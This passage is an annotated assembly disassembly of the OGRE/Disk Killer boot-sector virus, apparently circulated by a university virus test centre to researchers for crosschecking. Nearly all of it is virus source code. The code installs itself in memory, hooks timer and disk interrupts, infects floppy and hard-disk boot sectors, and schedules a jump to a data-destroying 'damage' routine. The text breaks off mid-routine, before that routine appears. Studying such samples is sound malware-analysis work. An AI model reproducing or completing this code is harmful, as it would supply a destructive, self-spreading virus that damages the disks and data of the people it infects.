  
PAGE  65,130
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€                                                                      €€
;€€     €    € €€€€€  €€€€     Virus Test Center                         €€
;€€     €    €   €   €         UniversitÑt Hamburg                       €€
;€€      €  €    €   €         SchlÅterstr. 70                           €€
;€€       €€     €    €€€€     2000 Hamburg 13                           €€
;€€                                                                      €€
;€€ This listing is only given to other computer virus researchers, who  €€
;€€ are deemed trustworthy, and then, only for the sake of crosschecking.€€
;€€ If you are not one of those, you have illegally obtained this copy.  €€
;€€ Be warned that distributing viruses is illegal under the laws of many€€
;€€ countries.                                                           €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€                                                                      €€
;€€                OGRE/Disk Killer virus                                €€
;€€                                                                      €€
;€€      Disassembled: Jan-90                                            €€
;€€                by: Morton Swimmer                                    €€
;€€                                                                      €€
;€€      Virus type: Boot sector                                         €€
;€€                                                                      €€
;€€                                                                      €€
;€€                                                                      €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

seg_0           segment at 0
                org     20h
int8_vector     dd      ?
                org     24h
int9_vector     dd      ?
                org     4Ch
int13_vector    dd      ?
                org     204h
int81_vector    dd      ?
                org     208h
int82_vector    dd      ?
                org     20ch
int83_vector    dd      ?

                org     0413h
mem_avail       dw      ?

seg_0           ends

ID_word         equ     3CCBh                                   ; (seg_a:3CCB=0)
  
seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
  
  
                org     0
  
ogre            proc    far
  
start:
                cli                                 ; Disable interrupts
                jmp     short loc_2                 ; (0052)

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                   Boot Record Parameters
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
disk_info         equ     this byte
system_ID         db      'MSDOS3.3'      ; system ID
BytesPerSector    dw      offset entry    ; bytes/sector
SectorsPerCluster db      2               ; sectors/cluster
ReservedSectors   dw      1               ; # of reserved sectors
FATcopies         db      2               ; # of FAT copies
RootDirEntries    dw      70h             ; # of root dir entries
SectorsPerDisk    dw      2D0h            ; sectors/disk
                  db      0FDh            ; format ID
SectorsPerFAT     dw      2               ; sectors/FAT
SectorsPerTrack   dw      9               ; sectors/Track
DiskHeads         dw      2               ; # of heads
SpecialResSectors db      0               ; # of special reserved sectors

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                      Data
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

                db      18 dup (0)
                db      12h, 0, 0, 0, 0, 1, 0
                db      0FAh, 33h, 0C0h, 8Eh, 0D0h, 0BCh, 0, 0
ogre_ID         dw      ID_word                     ;(003E) virus ID
original_bs     dw      48h                         ; sector # of original bootsector
                                                    ; (DOS notation)
virus_body      dd      00000044h                   ; position of virus body on
                                                    ; disk in DOS convention
_virus_body     dd      00000010h                   ; work copy
drive           db      0

                db      55h, 0, 0, 0, 0, 55h, 55h

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                      more code
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

loc_2:
                mov     ax,cs:mem_avail             ; BIOS: memory available variable
                mov     cl,6
                shl     ax,cl                       ; Shift w/zeros fill
                mov     ds,ax
                cmp     ogre_ID,ID_word             ; is the virus already in memory?
                jne     loc_3                       ; Jump if not equal
                push    ds
                lea     ax,cs:resident_entry
                push    ax
                sti                                 ; Enable interrupts
                retf                                ; jump into the resident virus

loc_3:                                              ; set segment registers
                mov     ax,7C00h
                mov     cl,4
                shr     ax,cl                       ; Shift w/zeros fill
                mov     cx,cs
                add     ax,cx
                mov     ds,ax
                mov     es,ax                       ; es = ds = (7C00>>4) + cs
                                                    ; = segment beginning with the virus
                mov     ss,cx                       ; ss = (7C00>>4)
                mov     sp,0F000h

                                                    ; Load rest of virus into
                                                    ; memory behind present position
                sti                                 ; Enable interrupts
                mov     drive,dl
                mov     cx,4
                mov     bx,BytesPerSector           ; = 200h (usually)

                mov     ax,word ptr virus_body      ; _virus_body := virus_body
                mov     word ptr _virus_body,ax
                mov     dx,word ptr virus_body[2]
                mov     word ptr _virus_body[2],dx
  
locloop_4:
                  push    cx
                  call    conv_notation             ; (00F4) convert DOS to BIOS notation
                  mov     cx,3
  
locloop_5:
                    push    cx
                    mov     al,1
                    call    rd_sector               ; (0143)
                    pop     cx
                    jnc     loc_6                   ; Jump if carry=0
                    mov     ah,0
                    int     13h                     ; Disk  dl=drive #: ah=func a0h
                                                    ;  reset disk, al=return status
                  loop    locloop_5                 ; Loop if cx > 0
  
                  int     18h                       ; ROM basic
loc_6:
                  call    inc_sector                ; (00E6)
                  mov     ax,word ptr _virus_body
                  mov     dx,word ptr _virus_body[2]
                  add     bx,BytesPerSector         ; (seg_a:000B=200h)
                  pop     cx
                loop    locloop_4                               ; Loop if cx > 0

                                                    ; reserve 8 pages of memory
                                                    ; for the virus at top of memory
                mov     ax,cs:mem_avail             ; BIOS: Memory available
                sub     ax,8
                mov     cs:mem_avail,ax             ; BIOS: Memory available
                mov     cl,6
                shl     ax,cl                       ; Shift w/zeros fill
                mov     es,ax                       ; es := mem_avail<<6
                                                    ;  = new location for virus
                                                    ; copy virus to top of memory
                mov     si,0
                mov     di,0
                mov     cx,0A00h
                cld                                 ; Clear direction
                rep     movsb                       ; Rep when cx >0 Mov [si] to es:[di]

                push    es
                mov     ax,BytesPerSector           ; (seg_a:000B=200h)
                push    ax
                retf                                ; long jump to entry
  
ogre            endp
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;               inc_sector SUBROUTINE(00E6)
; increment the sector number in _virus_body (DOS notation)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
inc_sector      proc    near
                mov     ax,word ptr _virus_body     ; (seg_a:0046)
                inc     ax
                mov     word ptr _virus_body,ax     ; (seg_a:0046)
                jnc     loc_ret_7                   ; Jump if carry=0
                inc     word ptr _virus_body[2]                                 ; (seg_a:0048=0)

loc_ret_7:
                retn
inc_sector      endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                      conv_notation  SUBROUTINE(00f4)
;
;   Covert from DOS sector notation to BIOS sector/head/track notation
;
;   input: the DOS sector number to convert in dx:ax
;
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
conv_notation   proc    near
                div     SectorsPerTrack             ; ax,dxrem=dx:ax/data
                inc     dl
                mov     sector,dl
                xor     dx,dx                       ; Zero register
                div     DiskHeads                   ; ax,dxrem=dx:ax/data
                mov     head,dl
                mov     track,ax
                retn
conv_notation   endp
  
                db      0A1h, 41h, 1
                db      8Bh, 0Eh, 1Ah, 0, 0F7h, 0E1h
                db      2, 6, 3Fh, 1, 80h, 0D4h
                db      0, 8Bh, 0Eh, 18h, 0, 0F7h
                db      0E1h, 8Ah, 0Eh, 40h, 1, 0FEh
                db      0C9h, 2, 0C1h, 80h, 0D4h, 0
                db      83h, 0D2h, 0, 0A3h, 46h, 0
                db      0A3h, 42h, 0, 89h, 16h, 48h
                db      0, 89h, 16h, 44h, 0, 0C3h
head            db      0   ;(013f)
sector          db      1   ;(0140)
track           dw      4   ;(0141)

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;               rd_sector, wr_sector, direct_int13  SUBROUTINEs(00E6)
;
;   read or write a sector using BIOS notation with data in
;   track, sector, head, drive variables
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
;
;         read a sector
  
rd_sector       proc    near
                mov     ah,2                        ; READ
                jmp     short direct_int13
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂ
;
;         write a sector
  
wr_sector:
                mov     ah,3                        ; WRITE
                jmp     short direct_int13
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂ
;
;         do whatever is in AH
  
direct_int13:
                mov     dx,track                    ; (seg_a:0141)
                mov     cl,6
                shl     dh,cl                       ; Shift w/zeros fill
                or      dh,sector                   ; (seg_a:0140)
                mov     cx,dx
                xchg    ch,cl                       ; ch = (HIBYTE(track)<<6)||sector
                mov     dl,drive                    ; (seg_a:004A)
                mov     dh,head                     ; (seg_a:013F)
                int     13h                         ; Disk  dl=drive #, dh=head #
                                                    ; upper 2 bits of cl and ch = track #
                                                    ; lower 6 bits of cl = sector #
                                                    ; es:bx read buffer
                                                    ; ah=function (2 or 3), al=sectors to read
                                                    ;  BIOS disk routines, al=return status
                org     $-1
code_patch      equ     this byte                   ; code patch to avoid problems
                org     $+1                         ; later when int 13 is replaced
                                                    ; with our own routine
                retn
rd_sector       endp
  
                db      0
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE(0167)
;
; N.B.: bx = offset buffer_area on entry (always)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
rd_bootsector   proc    near
                test    drive,80h                   ; check if hard disk
                jz      rd_FDbootsector             ; Jump if no hard disk
                call    rd_FDbootsector
                jc      loc_14                      ; error exit

                push    bx
                mov     cx,4
                mov     bx,1BEh
  
locloop_9:                                          ; ??????
                  mov     ah,buffer_area[bx]
                  cmp     ah,80h
                  je      loc_10                    ; Jump if equal
                  add     bx,10h
                loop    locloop_9                   ; Loop if cx > 0

                mov     marker1,0FFh                ; (seg_a:01F3)
;*              nop
                jmp     short loc_14                ; error exit
                nop
loc_10:
                mov     dl,drive                    ; (seg_a:004A)
                mov     _drive,dl                   ; (seg_a:01F4)
                mov     ax,word ptr buffer_area[bx+1]   ; (seg_a:08A3)
                and     ah,3Fh                      ; 00111111
                mov     _head_sector,ax             ; (seg_a:01F5)
                mov     ah,byte ptr buffer_area[bx+2]   ; (seg_a:08A4)
                mov     cl,6
                shr     ah,cl                       ; Shift w/zeros fill
                mov     al,byte ptr buffer_area[bx+3]   ; (seg_a:08A5)
                mov     _track,ax                   ; (seg_a:01F7)
                mov     marker1,55h                 ; (seg_a:01F3)
;*              nop
                pop     bx
                mov     ax,_track                   ; (seg_a:01F7)
                mov     track,ax                    ; (seg_a:0141)
                mov     ax,_head_sector             ; (seg_a:01F5)
                mov     word ptr head,ax            ; (seg_a:013F) head and sector
                jmp     short loc_12                ; read the sector
                nop
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;
  
rd_FDbootsector:
                mov     ax,0
                mov     track,ax                    ; track=0
                inc     ah
                mov     word ptr head,ax            ; => head=0, sector=1
                                                    ; => boot sector

loc_12:                                             ; read sector in track/head/sector/drive
                                                    ; N.B.: we get here two ways
                mov     cx,3
                mov     al,1
  
locloop_13:
                  push    cx
                  call    rd_sector                 ; read sector to bx
                  pop     cx
                  jnc     loc_15                    ; Jump if carry=0 (normal exit)

                  mov     ah,0
                  int     83h                       ; reset disk
                loop    locloop_13                  ; Loop if cx > 0
  
loc_14:
                stc                                 ; Set carry flag
                retn                                ; error exit
loc_15:
                clc                                 ; Clear carry flag
                retn                                ; normal exit
rd_bootsector   endp

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;               Data
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
  
                db      7 dup (0)
counter_lo      dw      0                           ; for int 8 (timer interrupt)
counter_hi      db      0                           ; for int 8 (timer interrupt)
marker1         db      0                           ; some sort of marker1?
_drive          db      80h
_head_sector    dw      101h
_track          dw      0
end_of_bs       equ     this byte
                db      0, 0, 0, 0, 0
                db      55h, 0AAh                   ; normal end of bs ID
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       External Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
entry:
                cli                                 ; Disable interrupts
                mov     byte ptr cs:code_patch,83h  ; (seg_a:0164=13h)
                xor     ax,ax                       ; Zero register
                mov     ds,ax

                                                        ; int 8 -> int 81
                mov     ax, word ptr ds:int8_vector     ; (0000:0020)
                mov     word ptr ds:int81_vector,ax     ; (0000:0204=0)
                mov     ax,word ptr ds:int8_vector[2]   ; (0000:0022)
                mov     word ptr ds:int81_vector[2],ax  ; (0000:0206=0)

                                                        ; int 13 -> int 83
                mov     ax,word ptr ds:int13_vector     ; (0000:004C=1DB1h)
                mov     word ptr ds:int83_vector,ax     ; (0000:020C=0)
                mov     ax,word ptr ds:int13_vector[2]  ; (0000:004E=70h)
                mov     word ptr ds:int83_vector[2],ax  ; (0000:020E=0)

                                                        ; hook int 8
                mov     ax,offset int_8_entry
                mov     word ptr ds:int8_vector,ax

                                                        ; hook int 13
                mov     ax,offset int_13_entry
                mov     word ptr ds:int13_vector,ax

                mov     ax,cs
                mov     word ptr ds:int8_vector[2],ax
                mov     word ptr ds:int13_vector[2],ax

                sti                                     ; Enable interrupts
                jmp     short loc_16
                nop

                                                    ; entry point into
                                                    ; virus if it is
                                                    ; already in memory
resident_entry: xor     ax,ax                       ; Zero register
                mov     ds,ax
                mov     ax,cs
                mov     es,ax
                mov     si,7C03h
                mov     di,3
                mov     cx,47h
                cld                                 ; Clear direction
                rep     movsb                       ; Rep when cx >0 Mov [si] to es:[di]
loc_16:
                xor     ax,ax                       ; Zero register
                mov     es,ax
                mov     ax,cs
                mov     ds,ax
                mov     ax,original_bs              ; (seg_a:0040=48h)
                xor     dx,dx                       ; Zero register
                call    conv_notation
                mov     bx,7C00h
                mov     cx,3
  
locloop_17:
                  push    cx
                  mov     al,1
                  call    rd_sector
                  jnc     loc_18                    ; Jump if carry=0
                  mov     ah,0
                  int     83h
                  pop     cx
                loop    locloop_17                  ; Loop if cx > 0
  
                int     18h                         ; ROM basic
loc_18:
;               jmp     far ptr [0000:7C00h]
                db      0eah, 0, 7ch, 0, 0
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;               External Entry Point for Timer Interrupt
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
int_8_entry:
                inc     cs:counter_lo               ; (seg_a:01F0=0)
                jnz     loc_19                      ; Jump if not zero
                inc     cs:counter_hi               ; (seg_a:01F2=0)
loc_19:
                int     81h
                iret                                ; Interrupt return
  
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       External Entry Point for Keyboard Interrupt
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
int_9_entry:
                int     82h
                retf    2                           ; Return far
  
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       External Entry Point for BIOS Disk Services
;
; capture all reads from disk
;
; if (function == READ)
;      AND (counter_lo > 0)         # within a 20.71 hour period
;      AND (counter_hi = 30h)       # after 993.96 hours (41 days)
; then damage!
;
;
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
int_13_entry:
                sti                                 ; Enable interrupts
                cmp     ah,2                        ; READ SECTOR
                jne     int_13_exit                      ; Jump if not equal
                cmp     cs:counter_lo,0             ; (seg_a:01F0)
                jbe     loc_20                      ; Jump if below or =
                cmp     cs:counter_hi,30h           ; (seg_a:01F2)
                jne     loc_20                      ; Jump if not equal
                jmp     damage                      ; (05C2) let's have some fun
loc_20:
                test    dl,80h                      ; is drive a hard disk
                jnz     loc_22                      ; Jump if hard disk (bit 7 set)

                test    cl,0C0h                     ; are the 2 high bit set: good sign the media is wierd
                jnz     int_13_exit                 ; Jump if not zero: leave
                cmp     ch,0
                jne     int_13_exit                 ; Jump if not equal: leave
                cmp     dh,0
                je      loc_23                      ; Jump if equal
int_13_exit:
                jmp     _int_13_exit                ; (034A) vamoush

                                                    ; drive is hard disk!
loc_22:
                test    cs:marker1,0AAh             ; BS was probably source of
                                                    ; of virus, else was just
                                                    ; infected.
                jz      loc_23                      ; Jump if zero

                                                    ; does data match with
                                                    ; source of virus?

                cmp     dl,cs:_drive                ; (seg_a:01F4)
                jne     int_13_exit                 ; Jump if not equal: leave
                cmp     dh,byte ptr cs:_head_sector ; (seg_a:01F5)
                jne     int_13_exit                 ; Jump if not equal: leave
                cmp     ch,byte ptr cs:_track       ; (seg_a:01F7)
                jne     int_13_exit                 ; Jump if not equal: leave
                dec     cs:counter2                 ; (seg_a:034F)
                jnz     int_13_exit                 ; Jump if not zero: leave
                mov     cs:marker2,0FFh             ; mark HD
                nop
                                                    ; HD or FD drive:
                                                    ; lets get down to the
                                                    ; nitty-gritty
loc_23:
                push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    es
                push    si
                mov     ax,cs
                mov     ds,ax
                mov     es,ax                       ; es = ds = cs

                cmp     byte ptr marker2,0FFh
                jne     loc_24                      ; Jump if not equal

                call    update_bs_data              ; (0352)
                jc      loc_27                      ; Jump if carry Set
                jmp     short loc_28                ; (0343)
                nop
                                                    ; it was a FD

loc_24:                                             ; load the BS
                mov     drive,dl                    ; (seg_a:004A)
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                call    rd_bootsector               ; (0167)
                jc      loc_27                      ; Jump if error

                mov     ax,[bx][offset ogre_ID]
                nop                                 ;*Fixup for MASM (M)
                cmp     ax,ID_word                  ; is BS infected?
                jne     loc_25                      ; Jump if not equal

                test    drive,80h                   ; (seg_a:004A)
                jz      loc_28                      ; Jump if zero
                mov     marker1,0AAh                ; (seg_a:01F3)
                jmp     short loc_28
                nop
loc_25:                                             ; infect a FD
                call    cp_boot_record              ; copy the boot record to

                test    drive,80h                   ; (seg_a:004A)
                jnz     loc_26                      ; Jump if not zero
                call    infect_FD                   ; (04A8)
                jc      loc_27                      ; Jump if carry Set
                jmp     short loc_28
                nop
loc_26:                                             ; infect a HD
                call    infect_HD
                jc      loc_27                      ; Jump if error
loc_27:
                nop
loc_28:
                pop     si
                pop     es
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                pop     ax
_int_13_exit:
                int     83h
                retf    2                           ; Return far

counter2        db      1   ; could this be some sort of counter?
marker2         db      0   ; is disk HD or FD
marker3         db      0
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE(0352)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
update_bs_data  proc    near
                mov     counter2,10h                ; (seg_a:034F)
                mov     marker2,0                   ; (seg_a:0350)
                mov     drive,dl                    ; (seg_a:004A)
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                call    rd_bootsector
                cmp     word ptr [bx][offset ogre_ID],ID_word
                nop                                 ;*Fixup for MASM (M)
                je      loc_30                      ; Jump if equal
                mov     marker1,0                   ; (seg_a:01F3)
                retn
loc_30:
                cmp     marker3,77h                 ; (seg_a:0351=0)
                je      loc_31                      ; Jump if equal
                mov     ax,[bx][offset counter_lo]
                add     counter_lo,ax               ; (seg_a:01F0=0)
                mov     al,counter_hi               ; (seg_a:01F2=0)
                adc     counter_hi,al               ; (seg_a:01F2=0)
                mov     marker3,77h                 ; (seg_a:0351=0)
loc_31:
                mov     ax,counter_lo
                mov     [bx][offset counter_lo],ax
                mov     al,counter_hi
                mov     [bx][offset counter_hi],al
                mov     ax,[bx][offset _head_sector]
                mov     word ptr head,ax
                mov     ax,[bx][offset _track]
                mov     track,ax
                mov     al,1
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                call    wr_sector
                mov     marker1,0AAh                ; (seg_a:01F3)
                retn
update_bs_data  endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE(03BB)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
infect_HD       proc    near
                mov     ax,word ptr SpecialResSectors   ; (seg_a:001C=0)
                cmp     ax,5
                jbe     loc_32                      ; Jump if below or =
                dec     ax
                xor     dx,dx                       ; Zero register
                mov     original_bs,ax              ; (seg_a:0040)
                call    conv_notation
                mov     al,1
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                call    wr_sector                   ; (0147)
                jc      loc_32                      ; Jump if carry Set
                mov     ax,original_bs              ; (seg_a:0040)
                xor     dx,dx                       ; Zero register
                sub     ax,4
                call    wr_virus_body               ; (03F6)
                jc      loc_32                      ; Jump if carry Set
                call    replace_bs                  ; (052D)
                jc      loc_32                      ; Jump if carry Set
                mov     marker1,0AAh                ; (seg_a:01F3)
                clc                                 ; Clear carry flag
                retn
loc_32:
                stc                                 ; Set carry flag
                retn
infect_HD       endp
  
last_data_cluster   dw      162h    ; last cluster available on disk
free_clusters       db      3
required_clusters   db      3
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;               wr_virus_body  SUBROUTINE(03F6)
;
; write the virus body to the sector pointed to by dx:ax
; input: dx:ax
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
wr_virus_body   proc    near
                mov     word ptr virus_body,ax      ; (seg_a:0042)
                mov     word ptr virus_body[2],dx   ; (seg_a:0044)
                call    conv_notation               ; (00F4)
                test    drive,80h                   ; is HD?
                jnz     loc_33                      ; Jump if HD
                mov     marker3,0                   ; (seg_a:0351)
loc_33:                                             ;
                mov     counter2,1                   ; (seg_a:034F)
                lea     bx,cs:[200h]                ; Load effective addr
                mov     al,4
                call    wr_sector                   ; (0147)
                mov     marker3,77h                 ; (seg_a:0351)
                retn
wr_virus_body   endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE(0420)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
flag_bad_sectors proc    near
                mov     ax,4
                inc     ax
                div     SectorsPerCluster           ; (seg_a:000D=2) al,ah rem = ax/data
                mov     required_clusters,al        ; (seg_a:03F5=3)
                cmp     ah,0
                je      loc_34                      ; Jump if equal
                inc     required_clusters           ; (seg_a:03F5)
                ; required_clusters = round(5/SectorsPerCluster)
loc_34:
                mov     ax,BytesPerSector           ; (seg_a:000B=200h)
                mov     cl,20h
